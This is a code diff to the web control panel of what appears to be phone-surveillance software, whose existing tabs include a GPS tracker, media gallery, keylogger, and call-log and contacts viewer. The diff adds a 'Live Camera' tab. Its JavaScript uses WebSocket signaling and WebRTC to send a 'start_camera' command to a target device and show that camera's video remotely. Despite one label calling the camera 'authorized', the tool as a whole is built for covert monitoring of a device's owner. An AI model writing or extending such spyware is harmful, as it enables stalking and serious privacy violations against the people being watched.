@@ -765,14 +765,51 @@ body {
     border-color: #ff3439;
 }
 
+/* ===== LIVE CAMERA ===== */
+.camera-container {
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 15px;
+}
+
+.camera-box {
+    width: 100%;
+    max-width: 800px;
+    height: 500px;
+    background: #120d10;
+    border: 1px solid #6f252c;
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #888;
+}
+
+#remoteVideo {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    border-radius: 16px;
+}
+
+.camera-controls button {
+    background: #ff3439;
+    color: white;
+    border: none;
+    border-radius: 30px;
+    padding: 12px 24px;
+    font-weight: 600;
+    cursor: pointer;
+    margin: 5px;
+}
+
 /* Responsive */
 @media(max-width: 900px) {
     .calls-contacts-container {
         grid-template-columns: 1fr;
     }
-}
-
-@media(max-width: 900px) {
     .gps-stats { grid-template-columns: repeat(2, 1fr); }
     .apps { grid-template-columns: repeat(2, 1fr); }
     .media-grid, .skeleton-grid { grid-template-columns: repeat(3, 1fr); }
@@ -833,6 +870,7 @@ body {
         <button class="control-btn" onclick="showGallery(this)">🖼 Media Gallery</button>
         <button class="control-btn" onclick="showKeylog(this)">⌨ Keylogger</button>
         <button class="control-btn" onclick="showCallsContacts(this)">📞 Calls & Contacts</button>
+        <button class="control-btn" onclick="showCamera(this)">🎥 Live Camera</button>
     </div>
 
     <!-- GPS Tracker Panel -->
@@ -941,6 +979,25 @@ body {
                     <div class="empty-state">👥 No contacts found</div>
                 </div>
                 <button class="footer-action" onclick="alert('View All Contacts')">👥 View All Contacts</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Live Camera Panel -->
+    <section class="panel" id="cameraPanel" style="display:none;">
+        <div class="panel-header">
+            <div>
+                <div class="panel-title">🎥 Live Camera</div>
+                <div class="panel-subtitle">Streaming from authorized device camera.</div>
+            </div>
+        </div>
+        <div class="camera-container">
+            <div class="camera-box">
+                <video id="remoteVideo" autoplay playsinline></video>
+            </div>
+            <div class="camera-controls">
+                <button onclick="startLiveCamera()">📸 Start Camera</button>
+                <button onclick="stopLiveCamera()">🛑 Stop</button>
             </div>
         </div>
     </section>
@@ -1106,7 +1163,6 @@ function updateGPSData(data) {
         document.getElementById("lngValue").textContent = lngVal.toFixed(6);
         document.getElementById("accuracyValue").textContent = accVal !== null ? accVal + " m" : "-- m";
         document.getElementById("lastUpdateValue").textContent = lastTime.toLocaleTimeString();
-
         const popupContent = `<b>LAST KNOWN LOCATION</b><br>Latitude: ${latVal.toFixed(6)}<br>Longitude: ${lngVal.toFixed(6)}${accVal !== null ? `<br>Accuracy: ${accVal} m` : ''}<br>Last updated: ${lastTime.toLocaleTimeString()}`;
         createOrUpdateMarker(latVal, lngVal, popupContent);
         map.flyTo([latVal, lngVal], 15, { duration: 1.5 });
@@ -1206,11 +1262,12 @@ function nextMedia() { if (galleryItems.length) { currentMediaIndex = (currentMe
 
 // ================== TABS ==================
 function setActiveTab(btn) { document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active")); btn.classList.add("active"); }
-function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "block"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; loadDeviceInfo(); }
-function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
-function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; fetchGalleryPhotos(false); }
-function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; document.getElementById("callsContactsPanel").style.display = "none"; refreshKeylog(); }
-function showCallsContacts(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "block"; fetchCallLogs(); fetchContacts(); }
+function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "block"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "none"; loadDeviceInfo(); }
+function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
+function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "none"; fetchGalleryPhotos(false); }
+function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "none"; refreshKeylog(); }
+function showCallsContacts(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "block"; document.getElementById("cameraPanel").style.display = "none"; fetchCallLogs(); fetchContacts(); }
+function showCamera(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "block"; }
 
 // ================== FORCE GPS UPDATE ==================
 async function forceGpsUpdate() {
@@ -1252,7 +1309,6 @@ async function refreshKeylog() {
             container.innerHTML = "No keylogs yet.";
             return;
         }
-        // নতুন ডেটা উপরে
         logs.reverse();
         container.innerHTML = logs.map(log => `
             <div class="keylog-entry">
@@ -1334,6 +1390,55 @@ async function fetchContacts() {
     }
 }
 
+// ================== LIVE CAMERA ==================
+let cameraWs;
+let cameraPc;
+
+function connectCameraSignaling(deviceId) {
+    const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
+    const wsUrl = `${protocol}${location.host}/ws?deviceId=${deviceId}&role=viewer`;
+    cameraWs = new WebSocket(wsUrl);
+    cameraWs.onmessage = async (event) => {
+        const msg = JSON.parse(event.data);
+        if (msg.type === 'signal') {
+            const data = msg.data;
+            if (!cameraPc) return;
+            if (data.sdp) {
+                await cameraPc.setRemoteDescription(new RTCSessionDescription(data.sdp));
+                if (data.sdp.type === 'offer') {
+                    const answer = await cameraPc.createAnswer();
+                    await cameraPc.setLocalDescription(answer);
+                    cameraWs.send(JSON.stringify({ type: 'signal', data: { sdp: cameraPc.localDescription } }));
+                }
+            } else if (data.ice) {
+                cameraPc.addIceCandidate(new RTCIceCandidate(data.ice));
+            }
+        } else if (msg.type === 'device_disconnected') {
+            stopLiveCamera();
+        }
+    };
+}
+
+async function startLiveCamera() {
+    const deviceId = getDeviceId();
+    cameraPc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+    cameraPc.ontrack = (event) => {
+        document.getElementById('remoteVideo').srcObject = event.streams[0];
+    };
+    connectCameraSignaling(deviceId);
+    setTimeout(() => {
+        if (cameraWs && cameraWs.readyState === WebSocket.OPEN) {
+            cameraWs.send(JSON.stringify({ type: 'start_camera' }));
+        }
+    }, 500);
+}
+
+function stopLiveCamera() {
+    if (cameraPc) { cameraPc.close(); cameraPc = null; }
+    if (cameraWs) { cameraWs.close(); cameraWs = null; }
+    document.getElementById('remoteVideo').srcObject = null;
+}
+
 // ================== AUTO REFRESH (5 SECONDS) ==================
 setInterval(() => {
     if (document.getElementById("keylogPanel").style.display === "block") {
@@ -1351,4 +1456,4 @@ init();
 </script>
 
 </body>
-</html>
+    </html>
